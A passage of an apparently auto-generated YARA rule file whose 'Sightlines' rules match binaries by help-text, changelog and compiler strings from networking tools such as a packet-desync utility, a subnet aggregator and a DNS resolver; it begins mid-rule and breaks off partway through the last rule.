    condition:
        uint32(0) == 0x464C457F and filesize < 1744384 and 12 of them
}

rule Sightlines_tlsh_0cd32f0e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0cd32f0e"
        date = "2026-10-30"
        campaign = "tlsh-0cd32f0e"
        family = ""
        hash = "2740b1bc0e728c4283846df94783844082eabd503ce1f86e3429159e1b4e8de3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0cd32f0e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "TLS_HANDSHAKE_QUIC_TP_ADDRESS_DISCOVERY=0x9f81a176 -- https://tools.ietf.org/html/draft-ietf-quic-ad" ascii
        $s1 = "TLS_HANDSHAKE_QUIC_TP_CIBIR_ENCODING=0x1000 -- https://datatracker.ietf.org/doc/html/draft-banks-qui" ascii
        $s2 = "TLS_HANDSHAKE_QUIC_TP_ENABLE_TIME_STAMP_V2=0x7158 -- https://tools.ietf.org/html/draft-huitema-quic-" ascii
        $s3 = "TLS_HANDSHAKE_QUIC_TP_MIN_ACK_DELAY_OLD=0xde1a -- https://tools.ietf.org/html/draft-iyengar-quic-del" ascii
        $s4 = "TLS_HANDSHAKE_QUIC_TP_VERSION_INFORMATION=0x11 -- https://tools.ietf.org/html/draft-ietf-quic-versio" ascii
        $s5 = "TLS_HANDSHAKE_QUIC_TP_MIN_ACK_DELAY_DRAFT05=0xff04de1a -- https://tools.ietf.org/html/draft-ietf-qui" ascii
        $s6 = "TLS_HANDSHAKE_QUIC_TP_MIN_ACK_DELAY=0xff04de1b -- https://tools.ietf.org/html/draft-ietf-quic-ack-fr" ascii
        $s7 = "TLS_HANDSHAKE_QUIC_TP_LOSS_BITS=0x1057 -- https://tools.ietf.org/html/draft-ferrieuxhamchaoui-quic-l" ascii
        $s8 = "TLS_HANDSHAKE_QUIC_TP_MIN_ACK_DELAY_DRAFT_V1=0xFF03DE1A -- https://tools.ietf.org/html/draft-ietf-qu" ascii
        $s9 = "TLS_HANDSHAKE_QUIC_TP_VERSION_INFORMATION_DRAFT=0xff73db -- https://datatracker.ietf.org/doc/draft-i" ascii
        $s10 = "TLS_HANDSHAKE_QUIC_TP_ENABLE_TIME_STAMP=0x7157 -- https://tools.ietf.org/html/draft-huitema-quic-ts-" ascii
        $s11 = "TLS_HANDSHAKE_QUIC_TP_MAX_DATAGRAM_FRAME_SIZE=0x20 -- https://datatracker.ietf.org/doc/html/draft-ie" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ccf9c08d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ccf9c08d"
        date = "2026-10-30"
        campaign = "tlsh-ccf9c08d"
        family = ""
        hash = "1f0862fe897eda7b6a8515f5a1c1b8b5dec3fe4fb4baa99071ac40e093a95d07"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ccf9c08d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; consider prefix lengths from 'min' to 'max'. examples : 22-30 (ipv4), 56-64 (ipv6)" ascii
        $s1 = "; ipv4 only : include subnets with more than mul/div ips. example : 3/4" ascii
        $s2 = "; ipv6 only : include subnets with more than N v6 ips. example : 5" ascii
        $s3 = "invalid parameter for prefix-length : %s" ascii
        $s4 = "invalid parameter for v4-threshold : %s" ascii
        $s5 = "invalid parameter for v6-threshold : %s" ascii
        $s6 = "GCC: (crosstool-NG 1.28.0) 15.2.0" ascii
        $s7 = " --prefix-length=min[-max]" ascii
        $s8 = "Required key not available" ascii
        $s9 = "Key was rejected by service" ascii
        $s10 = " --v4-threshold=mul/div" ascii
        $s11 = "github version %s (%s)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_14458f8c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-14458f8c"
        date = "2026-10-30"
        campaign = "tlsh-14458f8c"
        family = ""
        hash = "158efa1360dc715804e3142da684f3bc8a6cd07e84d0f3377c058a18eb029d6f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-14458f8c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; consider prefix lengths from 'min' to 'max'. examples : 22-30 (ipv4), 56-64 (ipv6)" ascii
        $s1 = "; ipv4 only : include subnets with more than mul/div ips. example : 3/4" ascii
        $s2 = "; ipv6 only : include subnets with more than N v6 ips. example : 5" ascii
        $s3 = "invalid parameter for prefix-length : %s" ascii
        $s4 = "invalid parameter for v4-threshold : %s" ascii
        $s5 = "invalid parameter for v6-threshold : %s" ascii
        $s6 = "GCC: (crosstool-NG 1.28.0) 15.2.0" ascii
        $s7 = " --prefix-length=min[-max]" ascii
        $s8 = "Required key not available" ascii
        $s9 = "Key was rejected by service" ascii
        $s10 = " --v4-threshold=mul/div" ascii
        $s11 = "github version %s (%s)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_26933922_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-26933922"
        date = "2026-10-30"
        campaign = "tlsh-26933922"
        family = ""
        hash = "1bd3bbf143f960fbd926dd4d48e2fadd04011274395090384ff97d229f20ede3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-26933922.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "d.googlesource.com/toolchain/llvm-project d8003a456d14a3deb8054cdaa529ffbf02d9b262)" ascii
        $s1 = "Android (13691557, +pgo, +bolt, +lto, +mlgo, based on r522817d) clang version 18.0.4 (https://androi" ascii
        $s2 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s3 = " --blob=<item_name>:[+ofs]@<filename>|0xHEX" ascii
        $s4 = "libunwind: malformed DW_CFA_GNU_negative_offset_extended DWARF unwind, reg too big" ascii
        $s5 = "libunwind: malformed DW_CFA_val_offset DWARF unwind, reg (%llu) out of range" ascii
        $s6 = "libunwind: malformed DW_CFA_val_expression DWARF unwind, reg too big" ascii
        $s7 = "reconstructed packet due to VERDICT_MODIFY. size %zu => %zu" ascii
        $s8 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s9 = "aes_gcm: wrong key length %u. should be 16,24,32." ascii
        $s10 = "libunwind: malformed DW_CFA_offset DWARF unwind, reg (%llu) out of range" ascii
        $s11 = "libunwind: malformed DW_CFA_val_offset_sf DWARF unwind, reg too big" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1232216 and 12 of them
}

rule Sightlines_tlsh_7aabf799_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-7aabf799"
        date = "2026-10-30"
        campaign = "tlsh-7aabf799"
        family = ""
        hash = "546367d7bd15c6f03eb76fbee3b81ad96e8e3e12c1cd2a79d31bc20b215e46a8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-7aabf799.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "d.googlesource.com/toolchain/llvm-project d8003a456d14a3deb8054cdaa529ffbf02d9b262)" ascii
        $s1 = "Android (13691557, +pgo, +bolt, +lto, +mlgo, based on r522817d) clang version 18.0.4 (https://androi" ascii
        $s2 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
        $s3 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s4 = "; time in msec to wait between EAI_AGAIN attempts. default %u" ascii
        $s5 = "; read from stdin binary DNS answer blob and parse it to ipv4/ipv6 addresses" ascii
        $s6 = "could not read DNS reply blob from stdin" ascii
        $s7 = "mdig stats : %02u:%02u:%02u : domains=%d success=%d error=%d" ascii
        $s8 = "; log successfully resolved domains to a file" ascii
        $s9 = "could not write DNS query blob to stdout" ascii
        $s10 = "; print resolve stats to stderr every N domains" ascii
        $s11 = "eagain-delay must be within 0..100000" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_34f54d2a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-34f54d2a"
        date = "2026-10-30"
        campaign = "tlsh-34f54d2a"
        family = ""
        hash = "20f0293705b9a958a1e218f547b827fa9ed8e50c484508c64f1f5bdc6f1f4669"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-34f54d2a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; consider prefix lengths from 'min' to 'max'. examples : 22-30 (ipv4), 56-64 (ipv6)" ascii
        $s1 = "; ipv4 only : include subnets with more than mul/div ips. example : 3/4" ascii
        $s2 = "; ipv6 only : include subnets with more than N v6 ips. example : 5" ascii
        $s3 = "invalid parameter for prefix-length : %s" ascii
        $s4 = "invalid parameter for v4-threshold : %s" ascii
        $s5 = "invalid parameter for v6-threshold : %s" ascii
        $s6 = "GCC: (crosstool-NG 1.28.0) 15.2.0" ascii
        $s7 = " --prefix-length=min[-max]" ascii
        $s8 = "Required key not available" ascii
        $s9 = "Key was rejected by service" ascii
        $s10 = " --v4-threshold=mul/div" ascii
        $s11 = "github version %s (%s)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_e31b6e4b_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-e31b6e4b"
        date = "2026-10-30"
        campaign = "tlsh-e31b6e4b"
        family = ""
        hash = "08b68d9cb8c19d8fbc02f39ab180abc82da175c762bcf69b4ddcb1af81ece07c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-e31b6e4b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; consider prefix lengths from 'min' to 'max'. examples : 22-30 (ipv4), 56-64 (ipv6)" ascii
        $s1 = "GCC: (Realtek RSDK-4.6.4 Build 2002) 4.6.4" ascii
        $s2 = "; ipv4 only : include subnets with more than mul/div ips. example : 3/4" ascii
        $s3 = "; ipv6 only : include subnets with more than N v6 ips. example : 5" ascii
        $s4 = "invalid parameter for prefix-length : %s" ascii
        $s5 = "invalid parameter for v4-threshold : %s" ascii
        $s6 = "invalid parameter for v6-threshold : %s" ascii
        $s7 = "Invalid multibyte format string." ascii
        $s8 = " --prefix-length=min[-max]" ascii
        $s9 = "EUQ\\J),HMP.5;VY9=@D'GKN" wide
        $s10 = "npxXoudifFeEgGaACSnmcs[" ascii
        $s11 = "g|GGGGGGGGGGGGGGSYYY*GGGGGGGGGGG_WLsxGGGGGGGGGGGGG_YYWGGGGGGGGGGGGXIZ+_IE_GIUIZYDF" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_7510d3a0_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-7510d3a0"
        date = "2026-10-30"
        campaign = "tlsh-7510d3a0"
        family = ""
        hash = "0ab0ed5f1fa6c1c40a28e26e87108018e178cff9d1e2355fc21040f8a976f47d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-7510d3a0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "d.googlesource.com/toolchain/llvm-project d8003a456d14a3deb8054cdaa529ffbf02d9b262)" ascii
        $s1 = "Android (13691557, +pgo, +bolt, +lto, +mlgo, based on r522817d) clang version 18.0.4 (https://androi" ascii
        $s2 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
        $s3 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s4 = "; time in msec to wait between EAI_AGAIN attempts. default %u" ascii
        $s5 = "; read from stdin binary DNS answer blob and parse it to ipv4/ipv6 addresses" ascii
        $s6 = "could not read DNS reply blob from stdin" ascii
        $s7 = "mdig stats : %02u:%02u:%02u : domains=%d success=%d error=%d" ascii
        $s8 = "; log successfully resolved domains to a file" ascii
        $s9 = "could not write DNS query blob to stdout" ascii
        $s10 = "; print resolve stats to stderr every N domains" ascii
        $s11 = "eagain-delay must be within 0..100000" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_51552694_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-51552694"
        date = "2026-10-30"
        campaign = "tlsh-51552694"
        family = ""
        hash = "3513e7f6dd838b5e4615592ce00b57f44a1f1ed95deb9c99d24b3998fed66754"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-51552694.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
        $s1 = "GCC: (Realtek RSDK-4.6.4 Build 2002) 4.6.4" ascii
        $s2 = "; output to stdout binary blob with DNS query. use --family to specify ip version." ascii
        $s3 = "; time in msec to wait between EAI_AGAIN attempts. default %u" ascii
        $s4 = "; read from stdin binary DNS answer blob and parse it to ipv4/ipv6 addresses" ascii
        $s5 = "could not read DNS reply blob from stdin" ascii
        $s6 = "mdig stats : %02u:%02u:%02u : domains=%d success=%d error=%d" ascii
        $s7 = "cannot create TLS data structures: ABORT" ascii
        $s8 = "; log successfully resolved domains to a file" ascii
        $s9 = "cannot allocate memory in static TLS block" ascii
        $s10 = "could not write DNS query blob to stdout" ascii
        $s11 = "; print resolve stats to stderr every N domains" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_d6b59b57_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d6b59b57"
        date = "2026-10-30"
        campaign = "tlsh-d6b59b57"
        family = ""
        hash = "00b869d11a07cd92f4c93b346e18d1d79f2fa9a22c34ca63dc8ba85b346d921f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d6b59b57.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "d.googlesource.com/toolchain/llvm-project d8003a456d14a3deb8054cdaa529ffbf02d9b262)" ascii
        $s1 = "Android (13691557, +pgo, +bolt, +lto, +mlgo, based on r522817d) clang version 18.0.4 (https://androi" ascii
        $s2 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s3 = " --blob=<item_name>:[+ofs]@<filename>|0xHEX" ascii
        $s4 = "reconstructed packet due to VERDICT_MODIFY. size %zu => %zu" ascii
        $s5 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s6 = "aes_gcm: wrong key length %u. should be 16,24,32." ascii
        $s7 = "aes_ctr: wrong key length %u. should be 16,24,32." ascii
        $s8 = "failed to reconstruct packet after VERDICT_MODIFY" ascii
        $s9 = " --lua-desync=<functon>[:param1=val1[:param2=val2]]" ascii
        $s10 = "; override fwmark for generated packets. default = 0x%08X (%u)" ascii
        $s11 = "unbinding existing nf_queue handler for AF_INET6 (if any)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_aa524e31_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-aa524e31"
        date = "2026-10-30"
        campaign = "tlsh-aa524e31"
        family = ""
        hash = "13b407513516565bb44d330e4f5018a6fdb8ccaac673a51a63f9a2ae42bcf009"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-aa524e31.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "FreeBSD clang version 10.0.0 (git@github.com:llvm/llvm-project.git llvmorg-10.0.0-0-gd32170dbd5b)" ascii
        $s1 = "$FreeBSD: releng/11.4/lib/csu/common/crtbrand.c 362094 2020-06-12 11:44:30Z gjb $" ascii
        $s2 = "$FreeBSD: releng/11.4/lib/csu/amd64/crt1.c 331722 2018-03-29 02:50:57Z eadler $" ascii
        $s3 = "$FreeBSD: releng/11.4/lib/csu/common/ignore_init.c 339300 2018-10-11 00:26:15Z emaste $" ascii
        $s4 = "$FreeBSD: releng/11.4/lib/csu/amd64/crtn.S 217105 2011-01-07 16:07:51Z kib $" ascii
        $s5 = "$FreeBSD: releng/11.4/lib/csu/amd64/crti.S 217105 2011-01-07 16:07:51Z kib $" ascii
        $s6 = "; consider prefix lengths from 'min' to 'max'. examples : 22-30 (ipv4), 56-64 (ipv6)" ascii
        $s7 = "; ipv4 only : include subnets with more than mul/div ips. example : 3/4" ascii
        $s8 = "; ipv6 only : include subnets with more than N v6 ips. example : 5" ascii
        $s9 = "invalid parameter for prefix-length : %s" ascii
        $s10 = "invalid parameter for v4-threshold : %s" ascii
        $s11 = "invalid parameter for v6-threshold : %s" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_65bf2a93_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-65bf2a93"
        date = "2026-10-30"
        campaign = "tlsh-65bf2a93"
        family = ""
        hash = "1403ddd3979715ba14fa8899ac2c537478dfdd911b21d6322959f726a93d795a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-65bf2a93.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "* nfqws2, zapret-lib: (LUA_COMPAT_VER=6) fix wrong spelling : WRITEABLE -> WRITABLE" ascii
        $s1 = "* nfqws2: (LUA_COMPAT_VER=4) support 48-bit arithmetics" ascii
        $s2 = "* blockcheck2: MULTIDISORDER=multidisorder_legacy" ascii
        $s3 = "* nfqws2: do not start if NFQWS2_COMPAT_VER unexpected" ascii
        $s4 = "* init.d: 50-dht4all NFQWS_OPT_DHT_PKT_OUT" ascii
        $s5 = "* nfqws2: gracefully shutdown on SIGINT and SIGTERM" ascii
        $s6 = "* nfqws2: desync function can explicitly return nil as a synonym of VERDICT_PASS" ascii
        $s7 = "* builder_linux: optional build with zlib-ng : set ZLIB_NG=1 variable" ascii
        $s8 = "* nfqws2: solved inability to get SSID using nl80211 on kernels 5.19+" ascii
        $s9 = "* nfqws2: bu8,bu16,bu24,bu32,swap16,swap32 functions now work with negative int" ascii
        $s10 = "* nfqws2: fix issues with 32-bit lua_Integer in lua<5.3 on 32-bit platforms" ascii
        $s11 = "* actions: build nfqws2 x86 binary with LUA 5.4, not with luajit" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_d37f68ac_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d37f68ac"
        date = "2026-10-30"
        campaign = "tlsh-d37f68ac"
        family = ""
        hash = "203515a39bda14edbe7958282001e1e301a270d5fe5ccdb8381a60f5b2a0ff69"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d37f68ac.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s1 = " --blob=<item_name>:[+ofs]@<filename>|0xHEX" ascii
        $s2 = "reconstructed packet due to VERDICT_MODIFY. size %zu => %zu" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s4 = "aes_gcm: wrong key length %u. should be 16,24,32." ascii
        $s5 = "aes_ctr: wrong key length %u. should be 16,24,32." ascii
        $s6 = "failed to reconstruct packet after VERDICT_MODIFY" ascii
        $s7 = " --lua-desync=<functon>[:param1=val1[:param2=val2]]" ascii
        $s8 = "; override fwmark for generated packets. default = 0x%08X (%u)" ascii
        $s9 = "unbinding existing nf_queue handler for AF_INET6 (if any)" ascii
        $s10 = "desync profile search for %s ip1=%s ip2=%s port=%u icmp=%u:%u l7proto=%s ssid='%s' mark=0x%08X hostn" ascii
        $s11 = "QUIC initial contains CRYPTO with full fragment coverage" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1447120 and 12 of them
}

rule Sightlines_tlsh_78254fdd_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-78254fdd"
        date = "2026-10-30"
        campaign = "tlsh-78254fdd"
        family = ""
        hash = "0c55795717181156301fa4964b2637cd7b229feba5e36ef3ecb2d629da86dbbb"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-78254fdd.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; override sockarg (SO_USER_COOKIE) for generated packets. default = 0x%08X (%u)" ascii
        $s1 = "FreeBSD clang version 10.0.0 (git@github.com:llvm/llvm-project.git llvmorg-10.0.0-0-gd32170dbd5b)" ascii
        $s2 = "$FreeBSD: releng/11.4/lib/csu/common/crtbrand.c 362094 2020-06-12 11:44:30Z gjb $" ascii
        $s3 = "$FreeBSD: releng/11.4/lib/csu/amd64/crt1.c 331722 2018-03-29 02:50:57Z eadler $" ascii
        $s4 = "$FreeBSD: releng/11.4/lib/csu/common/ignore_init.c 339300 2018-10-11 00:26:15Z emaste $" ascii
        $s5 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s6 = "$FreeBSD: releng/11.4/lib/csu/amd64/crtn.S 217105 2011-01-07 16:07:51Z kib $" ascii
        $s7 = "$FreeBSD: releng/11.4/lib/csu/amd64/crti.S 217105 2011-01-07 16:07:51Z kib $" ascii
        $s8 = " --blob=<item_name>:[+ofs]@<filename>|0xHEX" ascii
        $s9 = "reconstructed packet due to VERDICT_MODIFY. size %zu => %zu" ascii
        $s10 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s11 = "aes_gcm: wrong key length %u. should be 16,24,32." ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1187680 and 12 of them
}

rule Sightlines_tlsh_9fbcc0da_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-9fbcc0da"
        date = "2026-10-30"
        campaign = "tlsh-9fbcc0da"
        family = ""
        hash = "035b00547dad583fb13d20f6cd3cc4e52ae3ede90595277293dd41f703efdd33"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-9fbcc0da.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "d.googlesource.com/toolchain/llvm-project d8003a456d14a3deb8054cdaa529ffbf02d9b262)" ascii
        $s1 = "Android (13691557, +pgo, +bolt, +lto, +mlgo, based on r522817d) clang version 18.0.4 (https://androi" ascii
        $s2 = "; consider prefix lengths from 'min' to 'max'. examples : 22-30 (ipv4), 56-64 (ipv6)" ascii
        $s3 = "; ipv4 only : include subnets with more than mul/div ips. example : 3/4" ascii
        $s4 = "; ipv6 only : include subnets with more than N v6 ips. example : 5" ascii
        $s5 = "invalid parameter for prefix-length : %s" ascii
        $s6 = "invalid parameter for v4-threshold : %s" ascii
        $s7 = "invalid parameter for v6-threshold : %s" ascii
        $s8 = " --prefix-length=min[-max]" ascii
        $s9 = " --v4-threshold=mul/div" ascii
        $s10 = "github version %s (%s)" ascii
        $s11 = "; ipv4 list (default)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_714d4d03_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-714d4d03"
        date = "2026-10-30"
        campaign = "tlsh-714d4d03"
        family = ""
        hash = "2398d373f5345fae4600895aad551caa94458ff9a6c0a603e7bbe63a4bc2e9f8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-714d4d03.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s1 = " --blob=<item_name>:[+ofs]@<filename>|0xHEX" ascii
        $s2 = "reconstructed packet due to VERDICT_MODIFY. size %zu => %zu" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s4 = "aes_gcm: wrong key length %u. should be 16,24,32." ascii
        $s5 = "aes_ctr: wrong key length %u. should be 16,24,32." ascii
        $s6 = "failed to reconstruct packet after VERDICT_MODIFY" ascii
        $s7 = " --lua-desync=<functon>[:param1=val1[:param2=val2]]" ascii
        $s8 = "; override fwmark for generated packets. default = 0x%08X (%u)" ascii
        $s9 = "unbinding existing nf_queue handler for AF_INET6 (if any)" ascii
        $s10 = "desync profile search for %s ip1=%s ip2=%s port=%u icmp=%u:%u l7proto=%s ssid='%s' mark=0x%08X hostn" ascii
        $s11 = "QUIC initial contains CRYPTO with full fragment coverage" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1820256 and 12 of them
}

rule Sightlines_tlsh_6c644095_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6c644095"
        date = "2026-10-30"
        campaign = "tlsh-6c644095"
        family = ""
        hash = "1f3a2e3ec1b10ffda06a47cd2c4f6147a62cf0f777af7bb386eed7e2a19118b6"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6c644095.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s1 = " --blob=<item_name>:[+ofs]@<filename>|0xHEX" ascii
        $s2 = "reconstructed packet due to VERDICT_MODIFY. size %zu => %zu" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s4 = "aes_gcm: wrong key length %u. should be 16,24,32." ascii
        $s5 = "aes_ctr: wrong key length %u. should be 16,24,32." ascii
        $s6 = "failed to reconstruct packet after VERDICT_MODIFY" ascii
        $s7 = " --lua-desync=<functon>[:param1=val1[:param2=val2]]" ascii
        $s8 = "; override fwmark for generated packets. default = 0x%08X (%u)" ascii
        $s9 = "unbinding existing nf_queue handler for AF_INET6 (if any)" ascii
        $s10 = "desync profile search for %s ip1=%s ip2=%s port=%u icmp=%u:%u l7proto=%s ssid='%s' mark=0x%08X hostn" ascii
        $s11 = "QUIC initial contains CRYPTO with full fragment coverage" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_497e6d47_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-497e6d47"
        date = "2026-10-30"
        campaign = "tlsh-497e6d47"
        family = ""
        hash = "5c8da79724eb992eb76483d5d9e54d6c4c12e21125e70ec1a6b87268603b81e8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-497e6d47.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "; internal conntrack timeouts for TCP SYN, ESTABLISHED, FIN stages, UDP timeout. default %u:%u:%u:%u" ascii
        $s1 = " --blob=<item_name>:[+ofs]@<filename>|0xHEX" ascii
        $s2 = "reconstructed packet due to VERDICT_MODIFY. size %zu => %zu" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s4 = "aes_gcm: wrong key length %u. should be 16,24,32." ascii
        $s5 = "aes_ctr: wrong key length %u. should be 16,24,32." ascii
        $s6 = "failed to reconstruct packet after VERDICT_MODIFY" ascii
        $s7 = " --lua-desync=<functon>[:param1=val1[:param2=val2]]" ascii
        $s8 = "; override fwmark for generated packets. default = 0x%08X (%u)" ascii
        $s9 = "unbinding existing nf_queue handler for AF_INET6 (if any)" ascii
        $s10 = "desync profile search for %s ip1=%s ip2=%s port=%u icmp=%u:%u l7proto=%s ssid='%s' mark=0x%08X hostn" ascii
        $s11 = "QUIC initial contains CRYPTO with full fragment coverage" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1382032 and 12 of them
}

rule Sightlines_tlsh_516b3537_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-516b3537"
        date = "2026-10-30"
        campaign = "tlsh-516b3537"
        family = ""
        hash = "0f5b3d8c4151074556404025b362348036d314e1186d5e7675f525263a3db73c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-516b3537.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "6d0da78}\"/><supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/></application></compatibility><" ascii
        $s1 = "ortedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/><supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f" ascii
        $s2 = "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"><application><supportedOS Id=\"{e20" ascii
        $s3 = "11457-1546-43c5-a5fe-008deee3d3f0}\"/><supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/><supp" ascii
        $s4 = "GCC: (Rev4, Built by MSYS2 project) 16.2.0" ascii
        $s5 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:as" ascii
        $s6 = "m.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requested" ascii
        $s7 = "; how many times to retry if EAI_AGAIN received. default %u" ascii
